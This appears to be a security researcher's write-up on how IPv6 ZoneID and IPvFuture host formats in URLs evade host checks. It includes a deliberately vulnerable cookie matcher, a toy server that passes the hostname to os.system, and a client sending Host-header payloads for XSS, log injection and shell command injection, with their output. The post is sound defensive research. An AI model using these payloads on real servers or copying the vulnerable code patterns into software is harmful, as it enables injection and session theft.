# URL Host - Dangerous field

## Summary

1. The [RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax](https://www.ietf.org/rfc/rfc3986.txt) define the generic URI syntax, with the host field and several formats and dangerous characters.
2. The [RFC 6874 - Representing IPv6 Zone Identifiers in Address Literals and Uniform Resource Identifiers](https://www.ietf.org/rfc/rfc6874.txt) add the support for [RFC 4007 - IPv6 Scoped Address Architecture](https://www.ietf.org/rfc/rfc4007.txt) in URI.

I think these RFCs can cause security issues and bugs because the `host` field contains several formats, many of which accept dangerous characters:
 - `IPvFuture` where `sub-delims` can be used and some implementations does not comply with the RFC 3986 and accept multiples other characters.
 - `ZoneID` can contains many characters and some implementations does not comply with the RFC 6874 (comply only with RFC 4007).

## Context

### IPvFuture

In anticipation of future the [RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax](https://www.ietf.org/rfc/rfc3986.txt) define the `IPvFuture` format:

```
 unreserved    = ALPHA / DIGIT / "-" / "." / "_" / "~"
 sub-delims    = "!" / "$" / "&" / "'" / "(" / ")"
                 / "*" / "+" / "," / ";" / "="
 IPvFuture  = "v" 1*HEXDIG "." 1*( unreserved / sub-delims / ":" )
```

This format doesn't contain a character that allows parsing ambiguities but it contain many special characters.

### IPv6

The [RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax](https://www.ietf.org/rfc/rfc3986.txt) use [RFC 3513 - Internet Protocol Version 6 (IPv6) Addressing Architecture](https://www.ietf.org/rfc/rfc3513.txt) to define the IPv6 as following:

```
 IPv6address =                            6( h16 ":" ) ls32
                  /                       "::" 5( h16 ":" ) ls32
                  / [               h16 ] "::" 4( h16 ":" ) ls32
                  / [ *1( h16 ":" ) h16 ] "::" 3( h16 ":" ) ls32
                  / [ *2( h16 ":" ) h16 ] "::" 2( h16 ":" ) ls32
                  / [ *3( h16 ":" ) h16 ] "::"    h16 ":"   ls32
                  / [ *4( h16 ":" ) h16 ] "::"              ls32
                  / [ *5( h16 ":" ) h16 ] "::"              h16
                  / [ *6( h16 ":" ) h16 ] "::"

      ls32        = ( h16 ":" h16 ) / IPv4address
                  ; least-significant 32 bits of address

      h16         = 1*4HEXDIG
                  ; 16 bits of address represented in hexadecimal
```

The RFC 4007 define the support for a `ZoneID` concatened to IPv6 address format and the RFC 6874 update the RFC 3986 to support the `ZoneID` definition as following format:

```
pct-encoded   = "%" HEXDIG HEXDIG
unreserved    = ALPHA / DIGIT / "-" / "." / "_" / "~"
ZoneID = 1*( unreserved / pct-encoded )
IPv6addrz = IPv6address "%25" ZoneID
```

This format doesn't contain many special characters, it doesn't contain a character that allows parsing ambiguities, but it does contain all the characters that allow you to write an fqdn.

## Problems

1. The first source of the problems is not specific to URLs: the knowledge of the developers, the developers know neither these formats nor the dangers of using the host field.
2. Some implementations does not comply with the RFCs:
     - The `IPvFuture` format is not really know and used, some implementations doesn't comply with RFC to reduce code size or through ignorance.
     - In URL the IPv6 and `ZoneID` are sometime parsed with a IPv6 parser (comply with RFC 4007 where `ZoneID` format is defined as: `An implementation MAY support other kinds of non-null strings as <zone_id>.`). The RFC 6874 doesn't allow all non-null string characters for security reason and to avoid ambiguities in parsing.
3. The `host` element URI is an important element and is used for many usages:
     - Define where web cookie or credentials should be sent
     - `Host` header in HTTP
     - *hostname* to identify server by reverse-proxy or in logs
     - Maybe in some web page
     - In unsecure code evaluated

## POC and simplified examples

### Send a cookie

```python
from urllib.parse import urlparse
from fnmatch import fnmatch
from typing import Tuple

def get_hostname_and_path(url: str) -> Tuple[str, str]:
    """
    This function returns hostname and path from an URL.
    """

    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    path = parsed_url.path
    return hostname, path

def domain_match(cookie_domain: str, cookie_path: str, url: str) -> bool:
    """
    This function checks for a cookie if you should add it to a request for an URL.
    """

    hostname, path = get_hostname_and_path(url)

    if hostname.endswith(cookie_domain) and path.startswith(cookie_path):
        return True
    return False

cookie_domain = "example.com"
cookie_path = "/"

for url in ("http://example.com/", "http://google.com/", "http://[::1%example.com]/"):
    print(url, domain_match(cookie_domain, cookie_path, url))
```

This weak example is vulnerable and produce the following output:

```
http://example.com/ True
http://google.com/ False
http://[::1%example.com]/ True
```

#### Exploitation

The [RFC 6265 - HTTP State Management Mechanism](https://www.rfc-editor.org/rfc/rfc6265) how cookie domain should match the URI host:

```
5.1.3.  Domain Matching

   A string domain-matches a given domain string if at least one of the
   following conditions hold:

   o  The domain string and the string are identical.  (Note that both
      the domain string and the string will have been canonicalized to
      lower case at this point.)

   o  All of the following conditions hold:

      *  The domain string is a suffix of the string.

      *  The last character of the string that is not included in the
         domain string is a %x2E (".") character.

      *  The string is a host name (i.e., not an IP address).
```

1. When the *Host* field is an IP address there is no domain matching, the cookie should not be sent... But clients and servers need to works with IP address, so most of them implement the domain matching on IP address.
2. Domain matching do not consider the port, in python using `urllib.parse.urlparse` the `neloc` contain the port but the `hostname` does not contain the port. Many developpers use it for domain matching, the problem is: the IPv6 `ZoneID` and the `IPvFuture` is no longer identifiable because the `hostname` does not contains brackets (`[` and `]`, it's possible to detect IPv6 with colon: `:`, it's probably not implemented and `IPvFuture` can't be checked).

```python
>>> from urllib.parse import urlparse
>>> urlparse("http://test:80/")
ParseResult(scheme='http', netloc='test:80', path='/', params='', query='', fragment='')
>>> urlparse("http://test:80/").hostname
'test'
>>> urlparse("http://[v45.example.com]:80/").hostname
'v45.example.com'
>>> 
```

##### Implementations

Now check if we can exploit in few implementations:

1. Python and the standard library is **not vulnerable**: Keep square brackets `[]` (use `netloc`) to validate the host ([code](https://github.com/python/cpython/blob/ddc27f9c385f57db1c227b655ec84dcf097a8976/Lib/http/cookiejar.py#L619)):

```python
cut_port_re = re.compile(r":\d+$", re.ASCII)
def request_host(request):
    """Return request-host, as defined by RFC 2965.

    Variation from RFC: returned value is lowercased, for convenient
    comparison.

    """
    url = request.get_full_url()
    host = urllib.parse.urlparse(url)[1]
    if host == "":
        host = request.get_header("Host", "")

    # remove port, if present
    host = cut_port_re.sub("", host, 1)
    return host.lower()
```

2. Go and standard library is **not vulnerable**: check for `:` or `%` in the Host ([code](https://cs.opensource.google/go/go/+/refs/tags/go1.24.0:src/net/http/client.go;l=1020;drc=6b605505047416bbbf513bba1540220a8897f3f6)):

```go
func isDomainOrSubdomain(sub, parent string) bool {
    if sub == parent {
        return true
    }
    // If sub contains a :, it's probably an IPv6 address (and is definitely not a hostname).
    // Don't check the suffix in this case, to avoid matching the contents of a IPv6 zone.
    // For example, "::1%.www.example.com" is not a subdomain of "www.example.com".
    if strings.ContainsAny(sub, ":%") {
        return false
    }
    // If sub is "foo.example.com" and parent is "example.com",
    // that means sub must end in "."+parent.
    // Do it without allocating.
    if !strings.HasSuffix(sub, parent) {
        return false
    }
    return sub[len(sub)-len(parent)-1] == '.'
}
```

3. python-requests use urllib3 and is **not vulnerable**: ZoneID is not really supported (when you perform request with ZoneID it try to resolve as a hostame)
4. Ruby is **not vulnerable**: ZoneID is not supported

### Injection

There is too many HTTP servers so i don't check for all implementations, module, plugins, web-app... But there is probably multiples vulnerables running servers.

I write a minimal server and HTTP client for the demonstration:

#### Server

```python
from typing import Dict, Tuple, List, Callable, Iterable, Union
from wsgiref.simple_server import make_server, WSGIServer
from io import TextIOWrapper, BufferedReader
from wsgiref.util import FileWrapper
from urllib.parse import urlparse
from socket import AF_INET6
from logging import warning
from os import system

template = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
</head>
<body>
    <h1>Welcome on {} !</h1>
</body>
</html>"""

class WSGIServerIPv6(WSGIServer):
    address_family = AF_INET6

def get_full_url(environ) -> str:
    """
    This function returns the full URL for a WSGI server.
    """

    scheme = environ.get('wsgi.url_scheme', 'http')
    host = environ.get('HTTP_HOST', environ.get('SERVER_NAME'))
    path = environ.get('PATH_INFO', '')
    query = environ.get('QUERY_STRING', '')
    full_url = f"{scheme}://{host}{path}"
    if query:
        full_url += f"?{query}"
    return full_url

def application(environ: Dict[str, Union[str, bool, BufferedReader, TextIOWrapper, FileWrapper, Tuple[int, int]]], start_response: Callable[str, List[Tuple[str, str]]]) -> Iterable[bytes]:
    """
    This function implements a minimal WSGI server for the POC.
    """

    hostname = urlparse(get_full_url(environ)).hostname
    response = template.format(hostname)
    warning("Request for " + hostname)
    system(f'ping "{hostname}"')
    status = '200 OK'
    headers = [('Content-type', 'text/html')]
    start_response(status, headers)
    return [response.encode('utf-8')]

if __name__ == '__main__':
    with make_server('::1', 8000, application, WSGIServerIPv6) as httpd:
        print("Serving on port 8000...")
        httpd.serve_forever()
```

#### Client

```python
import socket

for payload in (
    "<img onerror=\"alert(1)\">HTML injection",
    "log injection: malicious log !",
    "code injection\" | echo \"Malicious payload"
):
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s.connect(("::1", 8000))
    request = f"GET / HTTP/1.1\r\nHost: [::1%{payload}]\r\n\r\n".encode()
    s.sendall(request)
    response = True
    while response:
        response = s.recv(4096)
        print(response.decode().strip())
    s.close()
```

#### Demonstrations

##### Server output

```
::1 - - [01/Mar/2025 14:25:32] "GET / HTTP/1.1" 200 252
WARNING:root:Request for ::1%<img onerror="alert(1)">HTML injection
Ping request could not find host ::1%<img onerror=alert(1)>HTML injection. Please check the name and try again.
::1 - - [01/Mar/2025 14:26:29] "GET / HTTP/1.1" 200 249
WARNING:root:Request for ::1%log injection: malicious log !
Ping request could not find host ::1%log injection: malicious log !. Please check the name and try again.
::1 - - [01/Mar/2025 14:26:29] "GET / HTTP/1.1" 200 241
WARNING:root:Request for ::1%code injection" | echo "Malicious payload
"Malicious payload"
::1 - - [01/Mar/2025 14:26:29] "GET / HTTP/1.1" 200 252
```

We have three vulnerabilities exploited: 

1. XSS (steal user or administrator sessions)
2. Log injection (hide malicious events, RCE with PHP or templating system, ...)
3. Code injection (execute malicious code, in my demonstration it's a system command but similar vulnerabilities can use any other syntax: PHP, SQL, Javascript, Python, ...)

## Conclusion

 - **Don't trust any field including valid and parsed host or IP**
 - If you are a developper speak about these problems with your colleagues
 - If you are `DevSecOps` consider the *host* as an user input (even if you use a secure parser)
